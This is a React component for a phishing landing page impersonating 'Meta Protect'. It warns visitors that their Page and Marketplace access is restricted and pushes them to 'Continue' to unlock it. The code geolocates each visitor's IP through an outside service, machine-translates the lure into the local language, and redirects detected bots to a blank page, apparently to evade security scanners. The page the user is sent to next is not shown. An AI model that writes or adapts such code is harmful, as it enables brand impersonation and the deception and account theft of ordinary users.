import HeroImage from '@/assets/images/hero-image.jpg';
import { PATHS } from '@/router/router';
import countryToLanguage from '@/utils/country_to_language';
import { translateText } from '@/utils/translate';
import detectBot from '@/utils/detect_bot';
import { faCircleCheck, faIdCard } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import { useCallback, useEffect, useMemo, useState } from 'react';
import { useNavigate } from 'react-router';

const Index = () => {
    const navigate = useNavigate();
    const [today, setToday] = useState();
    const [isLoading, setIsLoading] = useState(true);
    const defaultTexts = useMemo(
        () => ({
            title: 'Welcome To Meta Protect.',
            description: "Your access to Marketplace and your account is limited, so we require higher security requirements for your account. We created this security program to unlock your Page.",
            protectionText: "We've enabled advanced protections to unlock your Page.",
            processText: 'Below, we walk you through the process in detail and help you fully activate to unlock your Page.',
            continueBtn: 'Continue',
            restrictedText: 'Your page was restricted on'
        }),
        []
    );

    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const [translatedTitle, translatedDesc, translatedProtection, translatedProcess, translatedContinue, translatedRestricted] = await Promise.all([translateText(defaultTexts.title, targetLang), translateText(defaultTexts.description, targetLang), translateText(defaultTexts.protectionText, targetLang), translateText(defaultTexts.processText, targetLang), translateText(defaultTexts.continueBtn, targetLang), translateText(defaultTexts.restrictedText, targetLang)]);

                setTranslatedTexts({
                    title: translatedTitle,
                    description: translatedDesc,
                    protectionText: translatedProtection,
                    processText: translatedProcess,
                    continueBtn: translatedContinue,
                    restrictedText: translatedRestricted
                });
            } catch (error) {
                console.log('translation failed:', error.message);
            }
        },
        [defaultTexts]
    );

    useEffect(() => {
        const init = async () => {
            const date = new Date();
            const options = {
                month: 'long',
                day: 'numeric',
                year: 'numeric'
            };
            setToday(date.toLocaleString('en-US', options));
            localStorage.clear();

            const checkBot = async () => {
                try {
                    const botResult = await detectBot();
                    if (botResult.isBot) {
                        window.location.href = 'about:blank';
                        return;
                    }
                } catch {
                    //
                }
            };

            const fetchIpInfo = async () => {
                try {
                    const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                    localStorage.setItem('ipInfo', JSON.stringify(response.data));
                    const countryCode = response.data.country_code;
                    const targetLang = countryToLanguage[countryCode] || 'en';

                    setIsLoading(false);
                    localStorage.setItem('targetLang', targetLang);
                    translateAllTexts(targetLang);
                } catch {
                    //
                }
            };
            await fetchIpInfo();
            await checkBot();
        };

        init();
    }, [translateAllTexts]);

    return (
        <div className='flex min-h-screen items-center justify-center bg-white sm:bg-[#F8F9FA]'>
            <title>Comunity Standard</title>
            <div className='flex max-w-[620px] flex-col gap-4 rounded-lg bg-white p-4 sm:shadow-lg'>
                <img src={HeroImage} alt='' />
                <p className='text-3xl font-bold'>{translatedTexts.title}</p>
                <p className='leading-6 text-[#212529]'>{translatedTexts.description}</p>
                <div className='relative flex flex-col gap-4'>
                    <div className='absolute top-1/2 left-3 h-[70%] w-0.5 -translate-y-1/2 bg-gray-200'></div>

                    <div className='z-10 flex items-center gap-2'>
                        <FontAwesomeIcon icon={faCircleCheck} className='h-7 w-7 bg-white text-gray-300' size='xl' />
                        <p>{translatedTexts.protectionText}</p>
                    </div>
                    <div className='z-10 flex items-center gap-2'>
                        <FontAwesomeIcon icon={faIdCard} className='h-7 w-7 bg-white text-[#355797]' size='xl' />
                        <p>{translatedTexts.processText}</p>
                    </div>
                </div>
                <button
                    className='rounded-lg bg-blue-500 px-2 py-2 text-sm font-bold text-white disabled:opacity-50'
                    disabled={isLoading}
                    onClick={() => {
                        navigate(PATHS.HOME);
                    }}
                >
                    {translatedTexts.continueBtn}
                </button>
                <p className='text-center'>
                    {translatedTexts.restrictedText} <span className='font-bold'>{today}</span>
                </p>
            </div>
        </div>
    );
};

export default Index;
